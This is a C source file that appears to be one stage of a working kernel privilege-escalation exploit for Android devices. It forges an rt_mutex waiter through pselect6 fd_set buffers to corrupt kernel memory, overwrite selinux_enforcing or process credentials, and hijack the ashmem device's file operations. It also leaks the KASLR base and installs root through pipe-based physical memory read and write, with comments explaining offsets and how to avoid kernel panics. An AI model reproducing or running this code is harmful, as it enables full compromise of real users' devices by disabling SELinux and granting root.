#include "common.h"
#include "runtime_struct_offsets.h"
#include <time.h>
#include <signal.h>
static double fops_elapsed_ms(struct timespec *ref) {
  struct timespec now;
  clock_gettime(CLOCK_MONOTONIC, &now);
  return (now.tv_sec - ref->tv_sec) * 1000.0 + (now.tv_nsec - ref->tv_nsec) / 1e6;
}
extern int pselect_custom_write;

#define PSELECT_CFI_ROUTE_ATTEMPTS 8
#define PSELECT_EXPECTED_READY 9

atomic_int cfi_stage_done;
ssize_t cfi_write_ret = -1;
ssize_t cfi_read_ret = -1;
ssize_t cfi_read_slot_ret = -1;
ssize_t cfi_owner_ret = -1;
ssize_t cfi_restore_ret = -1;
uint64_t fops_before;
uint64_t fops_after;
int cfi_attempts;
int pipe_stage_attempts;
int cfi_dirty_seen;
int cfi_last_step;
int cfi_last_errno;
int kaslr_done;
int kaslr_step;
uint64_t kaslr_fops_alias;
uint64_t kaslr_open_ptr;
uint64_t kaslr_ioctl_ptr;
uint64_t kaslr_mmap_ptr;
uint64_t kaslr_release_ptr;
uint64_t kaslr_show_fdinfo_ptr;
uint64_t kaslr_base;
uint64_t kaslr_slide;
uint64_t kaslr_expected_ioctl;
uint64_t kaslr_expected_mmap;
uint64_t kaslr_expected_release;
uint64_t kaslr_expected_show_fdinfo;
uint64_t slide_bootid_before;
uint64_t slide_bootid_after;
uint64_t slide_bootid_want;
ssize_t slide_bootid_restore_ret = -1;

static int route_delay_usec(int attempt) {
  int default_delay = pselect_custom_write_enabled() ? 50000 : -1;
  int override = env_int_range("PSELECT_ROUTE_DELAY_USEC",
                               default_delay, -1, 1000000);
  if (override >= 0) {
    return override;
  }

  static const int delays[] = {
    50000, 30000, 70000, 10000, 100000, 150000, 20000, 120000,
  };

  int count = (int)(sizeof(delays) / sizeof(delays[0]));
  return delays[(attempt - 1) % count];
}

void fdset_put_word(fd_set *set, int word, uint64_t value) {
  unsigned long *bits = (unsigned long *)set;
  bits[word] = (unsigned long)value;
}

uint64_t fdset_get_word(const fd_set *set, int word) {
  const unsigned long *bits = (const unsigned long *)set;
  return bits[word];
}

static int pselect_words_per_set(void) {
  int bits_per_word = (int)(8 * sizeof(unsigned long));
  return (PSELECT_ROUTE_NFDS + bits_per_word - 1) / bits_per_word;
}

static int pselect_put_global_word(
    fd_set *in, fd_set *out, fd_set *ex, int words_per_set,
    int global_word, uint64_t value) {
  if (global_word < 0) {
    return 0;
  }

  int set_idx = global_word / words_per_set;
  int word_idx = global_word % words_per_set;
  switch (set_idx) {
    case 0:
      fdset_put_word(in, word_idx, value);
      return 1;
    case 1:
      fdset_put_word(out, word_idx, value);
      return 1;
    case 2:
      fdset_put_word(ex, word_idx, value);
      return 1;
    default:
      return 0;
  }
}

static void pselect_put_waiter_word(
    fd_set *in, fd_set *out, fd_set *ex, int words_per_set,
    int waiter_word, uint64_t value, const char *name) {
  int shift = env_int_range("PSELECT_SHIFT", PSELECT_WAITER_WORD_SHIFT, -14, 14);
  int global_word = shift + waiter_word;
  int placed = pselect_put_global_word(
      in, out, ex, words_per_set, global_word, value);
  if (!placed) {
    pr_warning("pselect cannot place %s waiter_word=%d global_word=%d "
               "words_per_set=%d nfds=%d\n",
               name, waiter_word, global_word, words_per_set,
               PSELECT_ROUTE_NFDS);
  }
}

void open_selected_fds(
    fd_set *in, fd_set *out, fd_set *ex, int read_fd, int write_fd) {
  (void)write_fd;

  int high_read = fcntl(read_fd, F_DUPFD, PSELECT_ROUTE_NFDS + 32);
  if (high_read < 0) {
    pr_warning("pselect F_DUPFD read errno=%d\n", errno);
    return;
  }
  for (int fd = 0; fd < PSELECT_ROUTE_NFDS; fd++) {
    if (FD_ISSET(fd, in) || FD_ISSET(fd, out) || FD_ISSET(fd, ex)) {
      dup2(high_read, fd);
    }
  }
  close(high_read);
  dup2(read_fd, PSELECT_ROUTE_NFDS - 1);
  FD_SET(PSELECT_ROUTE_NFDS - 1, ex);
}

void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
  FD_ZERO(in);
  FD_ZERO(out);
  FD_ZERO(ex);

  if (env_flag("PSELECT_SIMPLE_LAYOUT", 0)) {
    fdset_put_word(in, 0, fake_w0);
    fdset_put_word(in, 3, 0);
    fdset_put_word(ex, 0,
                   pselect_custom_write_enabled() ? fake_task :
                   text_addr(INIT_TASK));
    fdset_put_word(ex, 1, fake_lock);
    fdset_put_word(ex, 2, 3);
    fdset_put_word(ex, 3, 0);
    return;
  }

  int compact = active_offsets && active_offsets->waiter_compact;

  int words_per_set = pselect_words_per_set();
  struct pselect_waiter_word {
    int word;
    uint64_t value;
    const char *name;
  };

  struct pselect_waiter_word words_compact[] = {
    /* Classic 6.1 compact layout (W1/W2 child-node PI write). */
    {2, 0, "tree_left"},
    {3, 0, "pi_parent"},
    {4, 0, "pi_right"},
    {5, 0, "pi_left"},
    {6, pselect_custom_write_enabled() ? fake_task : text_addr(INIT_TASK), "task"},
    {7, fake_lock, "lock"},
    {8, 0, "prio"},
    {9, 0, "deadline"},
  };

  /* Parent-node ghost write via rb_erase of the stale waiter's pi_tree
   * from the REAL owner's pi_waiters.  The consumer does FUTEX_LOCK_PI on
   * f_pi_target, beats the stale waiter's priority (120 < 140), and
   * becomes the new top waiter.  task_blocks_on_rt_mutex then calls
   * rt_mutex_dequeue_pi(owner, old_top=stale_waiter), whose rb_erase
   * reads pi_pc/pi_right from the fdset overlay and fires
   * __rb_change_child(node, child=pi_right, parent=pi_pc&~3, root),
   * writing pi_right to *(pi_pc&~3 + 8) = *(target).
   *
   * tree_pc = 1 (BLACK root): keeps rb_insert_color safe when the
   * consumer is inserted into f_pi_target's wait tree — a BLACK parent
   * means no rotations, no grandparent deref.
   *
   * pi_pc bit 0 = 0 (RED): after rb_erase removes this node, RED color
   * means __rb_erase_color is skipped — no rebalancing walks sibling
   * pointers in uncontrolled kernel memory (which would crash).
   *
   * Reference mechanism (ghostlock-app): pi_left carries the TARGET address,
   * pi_pc carries a controlled page address (fake_right). rb_erase Case 2
   * (node has left child but no right child) replaces node with left child,
   * then writes node->__rb_parent_color to child->__rb_parent_color:
   *   child = node->rb_left = target
   *   child->__rb_parent_color = node->__rb_parent_color = fake_right
   * This writes fake_right (page addr with low byte 0x00) to *target.
   * For selinux_enforcing (byte 0): 0x00 = permissive.
   *
   * For mode 4 (fops redirect), keep the old target-8 mechanism. */
  uint64_t pi_pc_value, pi_right_value, pi_left_value;
  if (pselect_custom_write == 4) {
    pi_pc_value = (pselect_custom_target - 8) | 0;
    pi_right_value = fake_fops;
    pi_left_value = 0;
  } else if (pselect_custom_write_enabled()) {
    /* Preserve RB_EMPTY_NODE: set pi_pc to the pi_tree_entry's own
     * address so rt_mutex_dequeue_pi sees node->pc == node and skips
     * the Phase 2 rb_erase entirely.  Without this, the overlay
     * destroys the spray page's RB_EMPTY_NODE setup, causing Phase 2
     * to rb_erase through init_cred (mode 2) which corrupts it and
     * panics the kernel via __rb_change_child side-writes. */
    pi_pc_value = fake_w0 + 0x18;
    pi_right_value = 0;
    pi_left_value = 0;
  } else {
    pi_pc_value = (pselect_custom_target - 8) | 0;
    pi_right_value = fake_right;
    pi_left_value = 0;
  }
  /* Case 2 tree_entry (matching reference): tree_left = target gives a
   * SECOND ghost write through the first rb_erase.  rb_erase Case 2:
   * child = rb_left = target; child->__rb_parent_color = pc = fake_right.
   * So *(target) = fake_right = base+0x100, low byte 0x00 → enforcing=0.
   * For mode 4 (fops redirect), keep tree as harmless BLACK root leaf. */
  uint64_t tree_pc_val = pselect_custom_write_enabled() && fake_right
                         ? fake_right : 1;
  /* Mode 2 (cred): tree_left = target provides the cred ghost write via
   * Phase 1 (tree_entry rb_erase from fake_lock->waiters).  rb_erase
   * Case 2: child = rb_left = target; child->__rb_parent_color = tree_pc
   * = text_addr(init_cred).  So *(child_task + CRED_OFF) = init_cred.
   * __rb_change_child side-write lands on init_cred+8 (gid/suid, writable
   * via KIMAGE mapping on Qualcomm). */
  uint64_t tree_left_val = pselect_custom_write_enabled() && fake_right
                           ? pselect_custom_target : 0;
  struct pselect_waiter_word words_compact_m4[] = {
    {0, tree_pc_val, "tree_pc"},
    {1, 0, "tree_right"},
    {2, tree_left_val, "tree_left"},
    {3, pi_pc_value, "pi_pc"},
    {4, pi_right_value, "pi_right"},
    {5, pi_left_value, "pi_left"},
    {6, pselect_custom_write_enabled() ? fake_task : text_addr(INIT_TASK),
     "task"},
    {7, fake_lock, "lock"},
    {8, (uint64_t)FAKE_WAITER_PRIO, "prio"},
    {9, 0, "deadline"},
  };

  struct pselect_waiter_word words[] = {
    {2, 0, "tree_pc"},
    {3, 0, "tree_right"},
    {4, 0, "tree_left"},
    {5, 1, "tree_prio"},
    {6, 0, "tree_deadline"},
    {7, 0, "pi_parent"},
    {8, 0, "pi_right"},
    {9, 0, "pi_left"},
    {10, 1, "pi_prio"},
    {11, 0, "pi_deadline"},
    {12, pselect_custom_write_enabled() ? fake_task : text_addr(INIT_TASK),
     "task"},
    {13, fake_lock, "lock"},
    {14, 3, "wake_state"},
  };

  struct pselect_waiter_word *active_words =
      (compact && pselect_custom_write) ? words_compact_m4
                                        : (compact ? words_compact : words);
  size_t active_count =
      (compact && pselect_custom_write)
          ? sizeof(words_compact_m4) / sizeof(words_compact_m4[0])
          : compact ? sizeof(words_compact) / sizeof(words_compact[0])
                    : sizeof(words) / sizeof(words[0]);

  for (size_t i = 0; i < active_count; i++) {
    struct pselect_waiter_word *w = &active_words[i];
    pselect_put_waiter_word(
        in, out, ex, words_per_set, w->word, w->value, w->name);
  }

  if (env_flag("PSELECT_CANARY", 0)) {
    /* Field-position canaries: global word g carries 0xAAAA0000+g.
     * The walk's first deref of any overlay-derived field faults at the
     * canary of whichever word landed there, which measures the device's
     * actual buffer->waiter word mapping directly (fault G =>
     * lock-slot = buffer word G => D = 8*G - WAITER_LOCK_OFF).
     * PSELECT_CANARY=2 keeps the real fake_lock at waiter_word 7 so the
     * trylock passes and the walk maps the fields consumed AFTER it. */
    int mode = env_int_range("PSELECT_CANARY", 1, 0, 2);
    int lock_g = 7 + env_int_range("PSELECT_SHIFT",
                                   PSELECT_WAITER_WORD_SHIFT, -14, 14);
    for (int g = 0; g < 3 * words_per_set; g++) {
      if (mode == 2 && g == lock_g)
        continue; /* keep the real lock pointer: trylock must pass */
      pselect_put_global_word(
          in, out, ex, words_per_set, g, 0xAAAA0000ULL + (unsigned long)g);
    }
  }
}

static void pselect_sigusr1_nop(int sig __attribute__((unused))) {
  crash_log_write("SIGUSR1 received tid=%d\n", (int)syscall(SYS_gettid));
}

void do_pselect_fake_lock_route(void) {
  struct sigaction sa = { .sa_handler = pselect_sigusr1_nop, .sa_flags = 0 };
  sigemptyset(&sa.sa_mask);
  sigaction(SIGUSR1, &sa, NULL);

  if (!page_base || !fake_lock || !fake_fops) {
    cfi_last_step = 30;
    cfi_last_errno = 0;
    pr_error("pselect route missing kernel page base=%016zx lock=%016zx fops=%016zx\n",
             page_base, fake_lock, fake_fops);
    return;
  }

  struct timespec route_t0;
  clock_gettime(CLOCK_MONOTONIC, &route_t0);
  int calls = 0;
  int success = 0;
  int route_verified = 0;
  for (int route_attempt = 1; route_attempt <= PSELECT_CFI_ROUTE_ATTEMPTS;
       route_attempt++) {
    if (route_attempt != 1) {
      page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
      if (!page_base || !fake_lock || !fake_fops) {
        cfi_last_step = 34;
        cfi_last_errno = errno;
        pr_error("pselect retry page prepare failed attempt=%d base=%016zx "
                 "lock=%016zx fops=%016zx\n",
                 route_attempt, page_base, fake_lock, fake_fops);
        break;
      }
    }

    int pipefd[2];
    SYSCHK(pipe(pipefd));
    int block_fd = (int)syscall(SYS_timerfd_create, CLOCK_MONOTONIC, 0);
    if (block_fd < 0) {
      pr_warning("pselect timerfd_create failed errno=%d; using pipe read end\n",
                 errno);
      block_fd = pipefd[0];
    }
    int high_read = fcntl(block_fd, F_DUPFD, PSELECT_ROUTE_NFDS + 16);
    if (high_read < 0) {
      cfi_last_step = 31;
      cfi_last_errno = errno;
      pr_error("pselect F_DUPFD read errno=%d\n", errno);
      if (block_fd != pipefd[0]) {
        close(block_fd);
      }
      close(pipefd[0]);
      close(pipefd[1]);
      break;
    }

    fd_set in;
    fd_set out;
    fd_set ex;
    prepare_pselect_fdsets(&in, &out, &ex);
    pr_info("pselect route setup attempt=%d simple=%d shift=%d page=%016zx "
            "fake_lock=%016zx fake_w0=%016zx fake_task=%016zx "
            "in0=%016llx in3=%016llx out0=%016llx ex0=%016llx "
            "ex1=%016llx ex2=%016llx ex3=%016llx\n",
            route_attempt,
            env_flag("PSELECT_SIMPLE_LAYOUT", 0),
            env_int_range("PSELECT_SHIFT", PSELECT_WAITER_WORD_SHIFT, -14, 14),
            page_base, fake_lock, fake_w0, fake_task,
            (unsigned long long)fdset_get_word(&in, 0),
            (unsigned long long)fdset_get_word(&in, 3),
            (unsigned long long)fdset_get_word(&out, 0),
            (unsigned long long)fdset_get_word(&ex, 0),
            (unsigned long long)fdset_get_word(&ex, 1),
            (unsigned long long)fdset_get_word(&ex, 2),
            (unsigned long long)fdset_get_word(&ex, 3));
    pr_info("pselect overlay words: in1=%016llx in2=%016llx in4=%016llx "
            "out1=%016llx out2=%016llx out3=%016llx out4=%016llx ex4=%016llx\n",
            (unsigned long long)fdset_get_word(&in, 1),
            (unsigned long long)fdset_get_word(&in, 2),
            (unsigned long long)fdset_get_word(&in, 4),
            (unsigned long long)fdset_get_word(&out, 1),
            (unsigned long long)fdset_get_word(&out, 2),
            (unsigned long long)fdset_get_word(&out, 3),
            (unsigned long long)fdset_get_word(&out, 4),
            (unsigned long long)fdset_get_word(&ex, 4));
    fflush(stdout);
    int saved_stdout = dup(STDOUT_FILENO);
    open_selected_fds(&in, &out, &ex, high_read, pipefd[1]);

    atomic_store(&consumer_calls, 0);
    atomic_store(&consumer_success, 0);
    atomic_store(&punch_consume_stop, 0);
    int delay_usec = route_delay_usec(route_attempt);
    atomic_store(&main_route_delay_usec, delay_usec);

    /* pselect6, not select: on 5.10.240 genevn the pselect6 chain
     * (__arm64_sys_pselect6 0xa0 -> core_sys_select 0x1c0, stack_fds at
     * body_sp+0x50) puts the fd buffer at syscall_entry-0x210 — exactly the
     * stale waiter's base (futex chain: waiter = futex_entry-0x210), so the
     * in/out/ex words map 1:1 onto the waiter (w3-w5 pi_tree @0x18-0x28,
     * w6 task @0x30, w7 lock @0x38, w8 wake_state/prio @0x40/0x44,
     * w9 deadline @0x48). select()'s shallower wrapper (0x80) shifts the
     * buffer +0x20 and breaks the words_compact mapping. */
    struct timespec timeout = {
      .tv_sec = PSELECT_TIMEOUT_SEC,
#ifdef PSELECT_TIMEOUT_USEC
      .tv_nsec = PSELECT_TIMEOUT_USEC * 1000,
#else
      .tv_nsec = 0,
#endif
    };

    {
      int efd = open("/sys/fs/selinux/enforce", O_RDONLY);
      if (efd >= 0) {
        char ebuf[8] = {0};
        read(efd, ebuf, sizeof(ebuf) - 1);
        close(efd);
        pr_info("SELINUX PRE-pselect: enforce=%s\n", ebuf);
      }
    }
    crash_log_write("pselect PRE attempt=%d shift=%d\n", route_attempt,
                    env_int_range("PSELECT_SHIFT", PSELECT_WAITER_WORD_SHIFT, -14, 14));
    pr_info("pselect pre-select +%.0fms timeout=%ld.%03lds\n",
            fops_elapsed_ms(&route_t0), (long)timeout.tv_sec,
            timeout.tv_nsec / 1000000L);
    /* Signal consumer IMMEDIATELY before pselect6 — all I/O (logging,
     * SELinux check) must be done first.  If the consumer fires while the
     * waiter is still in a write()/open() syscall, the kernel stack holds
     * that syscall's frames instead of the pselect overlay, and the chain
     * walk reads garbage → kernel panic. */
    atomic_store(&punch_consume_go, route_attempt);
    errno = 0;
    int ret = (int)syscall(
        SYS_pselect6, PSELECT_ROUTE_NFDS, &in, &out, &ex, &timeout, NULL);
    int saved_errno = errno;
    crash_log_write("pselect POST ret=%d errno=%d\n", ret, saved_errno);
    if (saved_stdout >= 0) { dup2(saved_stdout, STDOUT_FILENO); close(saved_stdout); saved_stdout = -1; }
    pr_info("pselect post-select +%.0fms ret=%d errno=%d\n",
            fops_elapsed_ms(&route_t0), ret, saved_errno);
    atomic_store(&punch_consume_go, 0);
    /* Give consumer thread time to finish sched_setattr + chain walk
     * before reading success.  The chain walk can take 150-200ms on
     * this kernel (rt_mutex_setprio acquires CPU-0 rq lock), so 10ms
     * was far too short — consumer_success wasn't set yet. */
    usleep(300000);
    calls = atomic_load(&consumer_calls);
    success = atomic_load(&consumer_success);
    /* Check if SELinux was actually disabled by the ghost write */
    {
      int efd = open("/sys/fs/selinux/enforce", O_RDONLY);
      if (efd >= 0) {
        char ebuf[8] = {0};
        read(efd, ebuf, sizeof(ebuf) - 1);
        close(efd);
        crash_log_write("SELINUX enforce=%s\n", ebuf);
        pr_info("SELINUX CHECK after pselect: enforce=%s\n", ebuf);
      } else {
        crash_log_write("SELINUX open failed errno=%d\n", errno);
        pr_info("SELINUX CHECK open failed errno=%d; trying /proc\n", errno);
      }
      FILE *fp = fopen("/proc/self/attr/current", "r");
      if (fp) {
        char label[128] = {0};
        if (fgets(label, sizeof(label), fp)) {
          size_t len = strlen(label);
          if (len > 0 && label[len-1] == '\n') label[len-1] = '\0';
          pr_info("SELINUX LABEL: %s\n", label);
        }
        fclose(fp);
      }
    }
    pr_info("pselect returned attempt=%d ret=%d errno=%d calls=%d success=%d delay=%d\n",
            route_attempt, ret, saved_errno, calls, success, delay_usec);

    int route_quality_miss = 0;
    int route_signal = calls > 0 && success > 0;
    int cfi_probed = 0;
    if (route_signal) {
      cfi_probed = 1;
      if (ret != PSELECT_EXPECTED_READY) {
        pr_info("pselect route probing cfi attempt=%d ret=%d expected=%d\n",
                route_attempt, ret, PSELECT_EXPECTED_READY);
      }
      if (pselect_custom_write_enabled()) {
        cfi_last_step = 0;
        cfi_last_errno = 0;
        route_verified = 1;
      } else if (try_cfi_stage()) {
        cfi_last_step = 0;
        route_verified = 1;
      } else if (!cfi_last_step) {
        cfi_last_step = 32;
      }
    }
    if (!route_verified && route_signal) {
      route_quality_miss = 1;
      if (!cfi_probed) {
        cfi_last_step = 35;
        cfi_last_errno = saved_errno;
      }
      pr_info("pselect route quality miss attempt=%d/%d ret=%d expected=%d delay=%d; refreshing FOPS page\n",
              route_attempt, PSELECT_CFI_ROUTE_ATTEMPTS, ret,
              PSELECT_EXPECTED_READY, delay_usec);
    } else if (!route_verified) {
      cfi_last_step = 33;
      cfi_last_errno = saved_errno;
    }

    if (saved_stdout >= 0) { dup2(saved_stdout, STDOUT_FILENO); close(saved_stdout); saved_stdout = -1; }
    close(high_read);
    if (block_fd != pipefd[0]) {
      close(block_fd);
    }
    close(pipefd[0]);
    close(pipefd[1]);

    if (route_quality_miss) {
      continue;
    }
    if (route_verified || cfi_dirty_seen || cfi_last_step != 1) {
      break;
    }
    pr_info("pselect cfi write miss attempt=%d/%d errno=%d; refreshing FOPS page\n",
            route_attempt, PSELECT_CFI_ROUTE_ATTEMPTS, cfi_last_errno);
  }
  pr_info("pselect route done calls=%d success=%d step=%d errno=%d\n",
          calls, success, cfi_last_step, cfi_last_errno);
}

int repair_fake_fops_llseek(int fd) {
  uint64_t llseek = text_addr(NOOP_LLSEEK);
  uint64_t after = 0;
  uintptr_t slot = fake_fops + FOPS_LLSEEK_OFF;
  ssize_t wr = configfs_write_once(fd, slot, &llseek, sizeof(llseek));
  ssize_t rd = configfs_read_once(fd, slot, &after, sizeof(after));
  return wr == (ssize_t)sizeof(llseek) &&
         rd == (ssize_t)sizeof(after) &&
         after == llseek;
}

int refresh_fake_fops_text(int fd) {
  struct fops_slot {
    size_t off;
    uint64_t value;
  } slots[] = {
    {FOPS_READ_ITER_OFF, text_addr(CONFIGFS_READ_ITER)},
    {FOPS_WRITE_ITER_OFF, text_addr(CONFIGFS_BIN_WRITE_ITER)},
    {FOPS_IOCTL_OFF, text_addr(ASHMEM_IOCTL)},
    {FOPS_COMPAT_IOCTL_OFF, text_addr(ASHMEM_COMPAT_IOCTL)},
    {FOPS_MMAP_OFF, text_addr(ASHMEM_MMAP)},
    {FOPS_OPEN_OFF, text_addr(ASHMEM_OPEN)},
    {FOPS_RELEASE_OFF, text_addr(ASHMEM_RELEASE)},
    {FOPS_SPLICE_READ_OFF, text_addr(COPY_SPLICE_READ)},
    {FOPS_SHOW_FDINFO_OFF, text_addr(ASHMEM_SHOW_FDINFO)},
  };

  for (size_t i = 0; i < sizeof(slots) / sizeof(slots[0]); i++) {
    if (slots[i].off == 0) continue;
    uintptr_t target = fake_fops + slots[i].off;
    if (kernel_write_data(fd, target, &slots[i].value,
        sizeof(slots[i].value)) !=
        (ssize_t)sizeof(slots[i].value)) {
      return 0;
    }
  }
  return 1;
}

int leak_kernel_base(int fd) {
  kaslr_fops_alias = p0_data_alias(ASHMEM_FOPS);
  kaslr_open_ptr = kernel_read64(fd, kaslr_fops_alias + FOPS_OPEN_OFF);
  kaslr_ioctl_ptr = kernel_read64(fd, kaslr_fops_alias + FOPS_IOCTL_OFF);
  kaslr_mmap_ptr = kernel_read64(fd, kaslr_fops_alias + FOPS_MMAP_OFF);
  kaslr_release_ptr = kernel_read64(fd, kaslr_fops_alias + FOPS_RELEASE_OFF);
  kaslr_show_fdinfo_ptr =
    kernel_read64(fd, kaslr_fops_alias + FOPS_SHOW_FDINFO_OFF);

  if (!is_kernel_ptr(kaslr_open_ptr) || !is_kernel_ptr(kaslr_ioctl_ptr) ||
      !is_kernel_ptr(kaslr_mmap_ptr) || !is_kernel_ptr(kaslr_release_ptr) ||
      !is_kernel_ptr(kaslr_show_fdinfo_ptr)) {
    kaslr_step = 1;
    return 0;
  }

  kaslr_base = kaslr_open_ptr - (ASHMEM_OPEN - KIMAGE_TEXT_BASE);
  kaslr_slide = kaslr_base - KIMAGE_TEXT_BASE;
  kaslr_done = 1;
  kaslr_expected_ioctl = text_addr(ASHMEM_IOCTL);
  kaslr_expected_mmap = text_addr(ASHMEM_MMAP);
  kaslr_expected_release = text_addr(ASHMEM_RELEASE);
  kaslr_expected_show_fdinfo = text_addr(ASHMEM_SHOW_FDINFO);

  if (kaslr_ioctl_ptr != kaslr_expected_ioctl ||
      kaslr_mmap_ptr != kaslr_expected_mmap ||
      kaslr_release_ptr != kaslr_expected_release ||
      kaslr_show_fdinfo_ptr != kaslr_expected_show_fdinfo) {
    kaslr_done = 0;
    kaslr_step = 2;
    return 0;
  }

  if (!refresh_fake_fops_text(fd)) {
    kaslr_done = 0;
    kaslr_step = 3;
    return 0;
  }

  kaslr_step = 0;
  return 1;
}

int restore_slide_boot_id(int fd) {
  uintptr_t boot_id_data = SLIDE_RANDOM_BOOT_ID_DATA;
  slide_bootid_want = slide_canon_addr(SLIDE_SYSCTL_BOOTID);
  configfs_read_once(
      fd, boot_id_data, &slide_bootid_before, sizeof(slide_bootid_before));
  slide_bootid_restore_ret =
    configfs_write_once(
        fd, boot_id_data, &slide_bootid_want, sizeof(slide_bootid_want));
  configfs_read_once(
      fd, boot_id_data, &slide_bootid_after, sizeof(slide_bootid_after));
  pr_info("slide restore boot_id data pid=%d ret=%zd before=%016llx "
          "want=%016llx after=%016llx errno=%d\n",
          getpid(), slide_bootid_restore_ret,
          (unsigned long long)slide_bootid_before,
          (unsigned long long)slide_bootid_want,
          (unsigned long long)slide_bootid_after, errno);
  return slide_bootid_restore_ret == (ssize_t)sizeof(slide_bootid_want) &&
         slide_bootid_after == slide_bootid_want;
}

int install_child_root(int fd) {
  if (!install_pipe_physrw(fd)) return 0;
  /* Post-walk page state: was [fake_lock+0x10] corrupted, and what did
   * the erase/enqueue leave in W0's entries? */
  {
    uintptr_t a[10] = {
      page_base + 0x00, page_base + 0x08, page_base + 0x10, page_base + 0x18,
      page_base + 0x300, page_base + 0x308, page_base + 0x310,
      page_base + 0x318, page_base + 0x338, page_base + 0x400 + 0xa18,
    };
    unsigned long v[10];
    for (int i = 0; i < 10; i++) v[i] = (unsigned long)pipe_read64(fd, a[i]);
    pr_info("PAGEDUMP lock+00=%016lx +08=%016lx +10=%016lx +18=%016lx\n",
            v[0], v[1], v[2], v[3]);
    pr_info("PAGEDUMP w0+300=%016lx +308=%016lx +310=%016lx +318=%016lx\n",
            v[4], v[5], v[6], v[7]);
    pr_info("PAGEDUMP w0+338=%016lx task+a18=%016lx\n", v[8], v[9]);
  }
  if (install_umh_root(fd)) return 1;
  return install_android_root(fd);
}

int try_cfi_stage(void) {
  cfi_attempts++;
  int fd = open_ashmem_device();
  int dirty = 0;
  int can_read_back = 0;

  if (fd < 0) {
    cfi_last_step = 11;
    cfi_last_errno = errno;
    pr_info("cfi open failed path=%s errno=%d\n", ashmem_path, errno);
    return 0;
  }

  pr_info("cfi attempt=%d fd=%d path=%s fake_fops=%016zx target=%016zx "
          "ioctl=%016llx open=%016llx write_iter=%016llx\n",
          cfi_attempts, fd, ashmem_path, fake_fops, binwrite_target,
          (unsigned long long)text_addr(ASHMEM_IOCTL),
          (unsigned long long)text_addr(ASHMEM_OPEN),
          (unsigned long long)text_addr(CONFIGFS_BIN_WRITE_ITER));

  uintptr_t misc_fops = data_addr(ASHMEM_MISC_FOPS);
  char payload[] = "CFI_FRIENDLY_CONFIGFS_BIN_WRITE_OK";
  ssize_t n =
    configfs_write_once(fd, binwrite_target, payload, sizeof(payload));
  cfi_write_ret = n;
  pr_info("cfi write ret=%zd errno=%d\n", n, errno);
  if (n != (ssize_t)sizeof(payload)) {
    cfi_last_step = 1;
    cfi_last_errno = errno;
    goto fail;
  }
  dirty = 1;
  cfi_dirty_seen = 1;

  if (!repair_fake_fops_llseek(fd)) {
    cfi_last_step = 2;
    cfi_last_errno = errno;
    goto fail;
  }
  cfi_read_slot_ret = sizeof(uint64_t);
  can_read_back = 1;

  char readback[sizeof(payload)];
  memset(readback, 0, sizeof(readback));
  ssize_t r =
    configfs_read_once(fd, binwrite_target, readback, sizeof(readback));
  cfi_read_ret = r;
  pr_info("cfi read ret=%zd errno=%d\n", r, errno);
  if (r != (ssize_t)sizeof(readback) ||
      memcmp(readback, payload, sizeof(payload)) != 0) {
    cfi_last_step = 3;
    cfi_last_errno = errno;
    goto fail;
  }

  uint64_t before = 0;
  ssize_t rb = configfs_read_once(fd, misc_fops, &before, sizeof(before));
  fops_before = before;
  pr_info("cfi fops_before ret=%zd value=%016llx want=%016zx errno=%d\n",
          rb, (unsigned long long)before, fake_fops, errno);
  if (rb != (ssize_t)sizeof(before) || before != fake_fops) {
    cfi_last_step = 4;
    cfi_last_errno = errno;
    goto fail;
  }

  if (!restore_slide_boot_id(fd)) {
    cfi_last_step = 10;
    cfi_last_errno = errno;
    goto fail;
  }

  if (!leak_kernel_base(fd)) {
    cfi_last_step = 9;
    cfi_last_errno = errno;
    goto fail;
  }

  int installed = 0;
  pipe_stage_attempts = 0;
  for (int attempt = 0; attempt < PIPE_MAX_ATTEMPTS; attempt++) {
    pipe_stage_attempts++;
    if (attempt != 0) {
      reset_pipe_attempt();
    }
    if (install_child_root(fd)) {
      installed = 1;
      break;
    }
    if (pipe_cache_gate_ok && physrw_read_ok && physrw_write_ok &&
        physrw_read64_ok && physrw_write64_ok) {
      break;
    }
  }

  if (!installed) {
    cfi_last_step = 8;
    cfi_last_errno = errno;
    goto fail;
  }

  uint64_t original_fops = canon_addr(ASHMEM_FOPS);
  ssize_t restore = configfs_write_once(
      fd, misc_fops, &original_fops, sizeof(original_fops));
  cfi_restore_ret = restore;
  if (restore != (ssize_t)sizeof(original_fops)) {
    cfi_last_step = 5;
    cfi_last_errno = errno;
    goto fail;
  }

  uint64_t after = 0;
  ssize_t ra = configfs_read_once(fd, misc_fops, &after, sizeof(after));
  fops_after = after;
  if (ra != (ssize_t)sizeof(after) || after != canon_addr(ASHMEM_FOPS)) {
    cfi_last_step = 6;
    cfi_last_errno = errno;
    goto fail;
  }

  uint64_t null_owner = 0;
  ssize_t owner =
    configfs_write_once(fd, fake_fops, &null_owner, sizeof(null_owner));
  cfi_owner_ret = owner;
  SYSCHK(close(fd));
  if (owner == (ssize_t)sizeof(null_owner) &&
      restore == (ssize_t)sizeof(original_fops)) {
    cfi_last_step = 0;
    cfi_last_errno = 0;
    atomic_store(&cfi_stage_done, 1);
    return 1;
  }
  cfi_last_step = 7;
  cfi_last_errno = errno;
  return 0;

fail:
  if (dirty) {
    uint64_t original_fops_fail = p0_data_alias(ASHMEM_FOPS);
    if (kaslr_done) {
      original_fops_fail = canon_addr(ASHMEM_FOPS);
    }
    cfi_restore_ret = configfs_write_once(
        fd, misc_fops, &original_fops_fail, sizeof(original_fops_fail));
    if (can_read_back &&
        cfi_restore_ret == (ssize_t)sizeof(original_fops_fail)) {
      uint64_t after_fail = 0;
      if (configfs_read_once(fd, misc_fops, &after_fail, sizeof(after_fail)) ==
          (ssize_t)sizeof(after_fail)) {
        fops_after = after_fail;
      }
    }
    uint64_t null_owner_fail = 0;
    cfi_owner_ret = configfs_write_once(
        fd, fake_fops, &null_owner_fail, sizeof(null_owner_fail));
  }
  SYSCHK(close(fd));
  return 0;
}
